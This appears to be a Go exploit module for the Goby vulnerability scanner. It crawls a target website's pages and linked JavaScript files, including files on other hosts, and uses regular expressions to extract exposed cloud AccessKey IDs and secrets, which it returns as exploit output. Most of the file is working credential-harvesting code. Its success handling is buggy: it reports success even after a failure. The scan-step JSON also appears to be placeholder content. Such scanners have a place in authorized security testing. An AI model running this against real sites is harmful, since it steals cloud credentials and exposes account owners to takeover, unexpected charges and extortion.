package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Cloud-Service AccessKey Information Disclosure Vulnerability",
    "Description": "<p>Cloud services are services such as computer resources, storage space, applications, etc. provided over the Internet. An AccessKey is a credential used to complete authentication when you call a cloud API, and a compromised AccessKey can threaten the security of all resources under that account, incur unintended charges, and be used for malicious extortion.</p>",
    "Product": "Aliyun-Service",
    "Homepage": "https://www.aliyun.com/",
    "DisclosureDate": "2024-06-11",
    "PostTime": "2024-06-14",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "body=\"/js/vendors.\" || body=\"/js/main.\" || body=\"/js/mainifast.\" || body=\"/js/app.\" || body=\"/js/vendor.\"",
    "GobyQuery": "body=\"/js/vendors.\" || body=\"/js/main.\" || body=\"/js/mainifast.\" || body=\"/js/app.\" || body=\"/js/vendor.\"",
    "Level": "1",
    "Impact": "<p>AccessKey is the credential used to complete authentication when you call a cloud service API, and a compromise of the AccessKey can threaten the security of all resources under the account, generate unintended charges, and malicious extortion.</p>",
    "Recommendation": "<p>1. Set up access policies and white-list access through security devices such as firewalls. </p><p>2. Change the accesskey as soon as possible.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "getAccesskey",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "云服务 AccessKey 信息泄露漏洞",
            "Product": "Aliyun-Service",
            "Description": "<p>云服务是指通过互联网提供的计算机资源、存储空间、应用程序等服务。访问密钥（AccessKey）是您调用云服务API时用于完成身份验证的凭证，AccessKey泄露会威胁该账号下所有资源的安全、产生非预期的费用以及恶意勒索等。<br></p>",
            "Recommendation": "<p>1. 通过防⽕墙等安全设备设置访问策略，设置白名单访问。<br></p><p>2. 尽快更改accesskey。</p>",
            "Impact": "<p>访问密钥（AccessKey）是您调用云服务API时用于完成身份验证的凭证，AccessKey泄露会威胁该账号下所有资源的安全、产生非预期的费用以及恶意勒索等。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Cloud-Service AccessKey Information Disclosure Vulnerability",
            "Product": "Aliyun-Service",
            "Description": "<p>Cloud services are services such as computer resources, storage space, applications, etc. provided over the Internet.&nbsp;An AccessKey is a credential used to complete authentication when you call a cloud API, and a compromised AccessKey can threaten the security of all resources under that account, incur unintended charges, and be used for malicious extortion.<br></p>",
            "Recommendation": "<p>1. Set up access policies and white-list access through security devices such as firewalls.&nbsp;</p><p>2. Change the accesskey as soon as possible.<br></p>",
            "Impact": "<p>AccessKey is the credential used to complete authentication when you call a cloud service API, and a compromise of the AccessKey can threaten the security of all resources under the account, generate unintended charges, and malicious extortion.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10961"
}`

	setPayload1718164677 := func(hostInfo *httpclient.FixUrl) (string, string, error) {
		findJSUrl := func(htmlContent string) ([]string, []string, error) {
			jsUrl := []string{}
			fullUrl := []string{}
			reRequest := regexp.MustCompile(`src="(.*?)"`)
			if !reRequest.MatchString(htmlContent) {
				return jsUrl, fullUrl, fmt.Errorf("can't match value")
			}
			getname := reRequest.FindAllStringSubmatch(htmlContent, -1)
			for _, v := range getname {
				if len(v[1]) == 0 || !strings.Contains(v[1], ".js") {
					continue
				}
				if strings.Contains(v[1], "http") {
					fullUrl = append(fullUrl, v[1])
				} else {
					if v[1][0:1] != "/" {
						jsUrl = append(jsUrl, "/"+v[1])
					} else if v[1][0:2] == "//" {
						jsUrl = append(jsUrl, strings.Replace(v[1], "//", "/", 1))
					} else {
						jsUrl = append(jsUrl, v[1])
					}
				}
			}
			return jsUrl, fullUrl, nil
		}

		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		findOssAccessInfo := func(htmlContent string) string {
			ossAccessInfo := ""
			rule := []string{`ossAccessKeyId:"(.*?)"`, `ossAccessKeySecret:"(.*?)"`, `([A|a]ccess[K|k]ey[I|i][d|D]|[A|a]ccess[K|k]ey[S|s]ecret):"(.*?)"`,
				`secret[A|a]ccessKey:"(.*?)"`, `id[A|a]ccesskey:"(.*?)"`}
			for _, v := range rule {
				re := regexp.MustCompile(v)
				if !re.MatchString(htmlContent) {
					continue
				}
				ossAccessInfo_test := re.FindAllString(htmlContent, -1)
				if len(ossAccessInfo_test) == 0 {
					continue
				}

				for _, o := range ossAccessInfo_test {
					if strings.Contains(o, "\"\"") {
						continue
					}
					ossAccessInfo += o + "\n"
				}
			}
			return ossAccessInfo
		}
		resp, err := setGetRequest(hostInfo, "/", map[string]string{})
		if err != nil || resp.StatusCode != 200 || !strings.Contains(resp.RawBody, "src=\"") {
			return "", "", err
		}
		InfoAll := ""
		vulurl := ""
		accessInfo := findOssAccessInfo(resp.RawBody)
		if accessInfo != "" {
			InfoAll += accessInfo
			vulurl = hostInfo.FixedHostInfo + "/"
		}

		jsUrl, fullUrl, err := findJSUrl(resp.RawBody)
		if err != nil {
			return "", "", err
		}

		if len(jsUrl) != 0 {
			for _, v := range jsUrl {
				resp, err = setGetRequest(hostInfo, v, map[string]string{})
				if err != nil || resp.StatusCode != 200 {
					continue
				}
				AccessInfo := findOssAccessInfo(resp.RawBody)
				if AccessInfo != "" {
					InfoAll += AccessInfo
				}
				vulurl = hostInfo.FixedHostInfo + v
			}
		}
		if len(fullUrl) != 0 {
			for _, v := range fullUrl {
				matches := regexp.MustCompile(`(https?://[^/]+)(/.+)`).FindStringSubmatch(v)
				if len(matches) != 3 {
					continue
				}
				hostInfo.FixedHostInfo = matches[1]
				path := matches[2]
				resp, err = setGetRequest(hostInfo, path, map[string]string{})
				if err != nil || resp.StatusCode != 200 {
					continue
				}
				AccessInfo := findOssAccessInfo(resp.RawBody)
				if AccessInfo != "" {
					InfoAll += AccessInfo
					vulurl = hostInfo.FixedHostInfo + path
				}
			}
		}
		return InfoAll, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			InfoAll, VulUrl, err := setPayload1718164677(hostInfo)
			if err != nil || InfoAll == "" || strings.Contains(InfoAll, " ") {
				return false
			}
			ss.VulURL = VulUrl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "getAccesskey" {
				InfoAll, _, err := setPayload1718164677(expResult.HostInfo)
				if err != nil || InfoAll == "" || strings.Contains(InfoAll, " ") {
					expResult.Success = false
					expResult.Output = "没有AccessKey"
				}
				expResult.Success = true
				expResult.Output = InfoAll
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
